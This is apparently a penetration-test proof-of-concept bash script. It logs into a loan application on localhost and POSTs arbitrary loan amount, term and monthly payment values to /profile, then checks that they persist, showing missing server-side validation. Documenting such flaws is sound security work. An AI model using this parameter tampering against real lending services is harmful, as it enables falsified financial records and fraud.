#!/bin/bash

# POC: Business Logic Flaw - Arbitrary Modification of Loan Parameters
# Demonstrates that /profile endpoint accepts invalid loan parameters without validation

TARGET="http://localhost:80"
COOKIES_FILE="/tmp/loan_poc_cookies.txt"

echo "[*] Business Logic Flaw - Loan Parameters POC"
echo "[*] Target: $TARGET"
echo ""

# Step 1: Login to get authenticated session
echo "[+] Step 1: Authenticating..."
LOGIN_RESPONSE=$(curl -s -c "$COOKIES_FILE" -X POST "$TARGET/login" \
  -d "username=test&password=test" \
  -L)

# Verify login was successful
if echo "$LOGIN_RESPONSE" | grep -q "Dashboard\|home" || [ -f "$COOKIES_FILE" ]; then
  echo "[✓] Authentication successful"
else
  echo "[-] Authentication failed"
  exit 1
fi

# Step 2: Retrieve initial loan state
echo ""
echo "[+] Step 2: Getting initial loan state..."
INITIAL_STATE=$(curl -s -b "$COOKIES_FILE" "$TARGET/profile")
INITIAL_AMOUNT=$(echo "$INITIAL_STATE" | grep -oP 'name="loan_amount"[^>]*value="\K[^"]*' | head -1)
INITIAL_TERM=$(echo "$INITIAL_STATE" | grep -oP 'name="loan_term_months"[^>]*value="\K[^"]*' | head -1)
INITIAL_PAYMENT=$(echo "$INITIAL_STATE" | grep -oP 'name="monthly_payment"[^>]*value="\K[^"]*' | head -1)

echo "[*] Initial values:"
echo "    loan_amount: $INITIAL_AMOUNT"
echo "    loan_term_months: $INITIAL_TERM"
echo "    monthly_payment: $INITIAL_PAYMENT"

# Step 3: Validate mathematical relationship (should be: payment * term ≈ amount)
if [ -n "$INITIAL_AMOUNT" ] && [ -n "$INITIAL_TERM" ] && [ -n "$INITIAL_PAYMENT" ]; then
  EXPECTED_PAYMENT=$(echo "scale=2; $INITIAL_AMOUNT / $INITIAL_TERM" | bc 2>/dev/null || echo "N/A")
  echo "[*] Expected monthly payment (amount/term): $EXPECTED_PAYMENT"
  echo "[*] Actual monthly payment: $INITIAL_PAYMENT"
fi

# Step 4: POST arbitrary loan parameters that violate business logic
echo ""
echo "[+] Step 3: Sending POST with arbitrary parameters..."
echo "    Attempting to set: loan_amount=999999, loan_term_months=12, monthly_payment=83333"
echo "    (This violates math: 83333 * 12 = 999996, not 999999)"

POST_RESPONSE=$(curl -s -b "$COOKIES_FILE" -X POST "$TARGET/profile" \
  -d "name=Test&lastname=User&email=test@example.com&loan_amount=999999&loan_term_months=12&monthly_payment=83333" \
  -i)

# Check if POST was accepted
if echo "$POST_RESPONSE" | grep -q "302\|303\|200"; then
  echo "[✓] POST request accepted (HTTP $(echo "$POST_RESPONSE" | head -1))"
else
  echo "[-] POST request failed"
  echo "$POST_RESPONSE"
fi

# Step 5: Verify the arbitrary values were persisted
echo ""
echo "[+] Step 4: Verifying persistence of invalid parameters..."
UPDATED_STATE=$(curl -s -b "$COOKIES_FILE" "$TARGET/profile")
UPDATED_AMOUNT=$(echo "$UPDATED_STATE" | grep -oP 'name="loan_amount"[^>]*value="\K[^"]*' | head -1)
UPDATED_TERM=$(echo "$UPDATED_STATE" | grep -oP 'name="loan_term_months"[^>]*value="\K[^"]*' | head -1)
UPDATED_PAYMENT=$(echo "$UPDATED_STATE" | grep -oP 'name="monthly_payment"[^>]*value="\K[^"]*' | head -1)

echo "[*] Updated values:"
echo "    loan_amount: $UPDATED_AMOUNT"
echo "    loan_term_months: $UPDATED_TERM"
echo "    monthly_payment: $UPDATED_PAYMENT"

# Step 6: Validate the vulnerability
echo ""
echo "[+] Step 5: Vulnerability Analysis..."

VULN_FOUND=0

if [ "$UPDATED_AMOUNT" = "999999" ]; then
  echo "[✓] VULNERABILITY CONFIRMED: Arbitrary loan_amount accepted and persisted (999999)"
  VULN_FOUND=1
fi

if [ "$UPDATED_TERM" = "12" ]; then
  echo "[✓] VULNERABILITY CONFIRMED: Arbitrary loan_term_months accepted and persisted (12)"
  VULN_FOUND=1
fi

if [ "$UPDATED_PAYMENT" = "83333" ]; then
  echo "[✓] VULNERABILITY CONFIRMED: Arbitrary monthly_payment accepted and persisted (83333)"
  VULN_FOUND=1
fi

# Check mathematical relationship violation
if [ -n "$UPDATED_AMOUNT" ] && [ -n "$UPDATED_TERM" ] && [ -n "$UPDATED_PAYMENT" ]; then
  CALCULATED_PRODUCT=$(echo "scale=2; $UPDATED_PAYMENT * $UPDATED_TERM" | bc 2>/dev/null || echo "0")
  echo "[!] Mathematical relationship check:"
  echo "    Expected: monthly_payment × term ≈ loan_amount"
  echo "    Calculated: $UPDATED_PAYMENT × $UPDATED_TERM = $CALCULATED_PRODUCT"
  echo "    Actual loan_amount: $UPDATED_AMOUNT"
  
  # Compare values (allowing for rounding)
  DIFF=$(echo "scale=0; ($UPDATED_AMOUNT - $CALCULATED_PRODUCT) / 1" | bc 2>/dev/null || echo "999999")
  if [ "${DIFF#-}" -gt 100 ] 2>/dev/null; then
    echo "[✓] BUSINESS LOGIC VIOLATION: Mathematical relationship not validated!"
    VULN_FOUND=1
  fi
fi

# Step 7: Test second modification to confirm pattern
echo ""
echo "[+] Step 6: Testing second modification..."
POST_RESPONSE2=$(curl -s -b "$COOKIES_FILE" -X POST "$TARGET/profile" \
  -d "name=Test&lastname=User&email=test@example.com&loan_amount=123456&loan_term_months=24&monthly_payment=5144" \
  -i)

if echo "$POST_RESPONSE2" | grep -q "302\|303\|200"; then
  echo "[✓] Second POST request accepted"
  
  FINAL_STATE=$(curl -s -b "$COOKIES_FILE" "$TARGET/profile")
  FINAL_AMOUNT=$(echo "$FINAL_STATE" | grep -oP 'name="loan_amount"[^>]*value="\K[^"]*' | head -1)
  
  if [ "$FINAL_AMOUNT" = "123456" ]; then
    echo "[✓] VULNERABILITY CONFIRMED: Second arbitrary modification persisted (123456)"
    VULN_FOUND=1
  fi
fi

echo ""
echo "========================================"
if [ $VULN_FOUND -eq 1 ]; then
  echo "[✓] VULNERABILITY CONFIRMED: Business logic flaw in loan parameter modification"
  echo "    Application accepts invalid loan parameters without validation"
  exit 0
else
  echo "[-] Vulnerability not confirmed"
  exit 1
fi